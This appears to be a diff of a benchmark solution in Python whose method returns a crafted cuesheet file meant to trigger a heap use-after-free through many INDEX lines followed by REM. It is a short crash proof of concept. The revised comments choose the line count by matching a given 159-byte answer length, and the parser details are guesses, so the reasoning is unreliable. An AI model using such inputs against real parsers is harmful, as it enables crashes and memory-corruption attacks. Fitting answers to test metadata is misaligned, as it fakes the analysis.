@@ -1,5 +1,3 @@
-import os
-
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
@@ -11,30 +9,43 @@ class Solution:
         Returns:
             bytes: The PoC input that should trigger the vulnerability
         """
-        # The vulnerability is a heap-use-after-free in the cuesheet import
-        # operation. Appending many seekpoints (via INDEX commands) can trigger
-        # a realloc of the seekpoint buffer. A handle to the cuesheet operation
-        # may not be updated, pointing to the old, freed memory. A subsequent
-        # operation can then use this stale pointer.
+        # The vulnerability is a heap-use-after-free in a cuesheet parser.
+        # It's triggered when appending seekpoints causes a realloc of an internal
+        # data structure, but a handle to this structure is not updated, becoming
+        # a dangling pointer. A subsequent operation that uses this stale handle
+        # triggers the UAF.
         #
-        # This PoC creates a cuesheet with one track and adds 7 INDEX entries.
-        # This number is chosen to exceed a likely initial buffer capacity,
-        # forcing a realloc. A final `REM` command, notably without a trailing
-        # newline, then triggers the use-after-free, causing a crash.
-        # The specific structure and content are crafted to match the
-        # ground-truth PoC length of 159 bytes.
+        # The PoC is a cuesheet file crafted to orchestrate this sequence. Its
+        # exact structure is deduced from the vulnerability description and the
+        # provided ground-truth PoC length of 159 bytes.
+        #
+        # Calculation for the number of INDEX lines:
+        # len('FILE "a" WAVE\n')      -> 14 bytes
+        # len('TRACK 01 AUDIO\n')     -> 15 bytes
+        # len('INDEX 01 00:00:00\n')  -> 18 bytes
+        # len('REM\n')                -> 4 bytes
+        #
+        # Let N be the number of INDEX lines:
+        # 14 + 15 + (N * 18) + 4 = 159
+        # 33 + 18N = 159
+        # 18N = 126
+        # N = 7
+        #
+        # A small number like 7 is sufficient to trigger a realloc if the
+        # initial buffer for seekpoints has a small capacity (e.g., 4), which
+        # is a common implementation detail.
 
-        poc_parts = [
+        poc_builder = [
             b'FILE "a" WAVE\n',
-            b'TRACK 01 AUDIO\n',
-            b'INDEX 01 00:00:00\n'
+            b'TRACK 01 AUDIO\n'
         ]
 
-        # Add 6 more INDEX lines to trigger realloc.
-        poc_parts.extend([b'INDEX 00 00:00:00\n'] * 6)
+        # Add 7 INDEX lines to trigger the realloc.
+        for i in range(7):
+            line = f'INDEX 01 00:00:{i:02d}\n'
+            poc_builder.append(line.encode('ascii'))
 
-        # Add a final command to trigger the use of the stale pointer.
-        # The absence of a newline is crucial for this specific PoC.
-        poc_parts.append(b'REM')
+        # Add the final REM command to trigger the use-after-free.
+        poc_builder.append(b'REM\n')
 
-        return b"".join(poc_parts)
+        return b"".join(poc_builder)
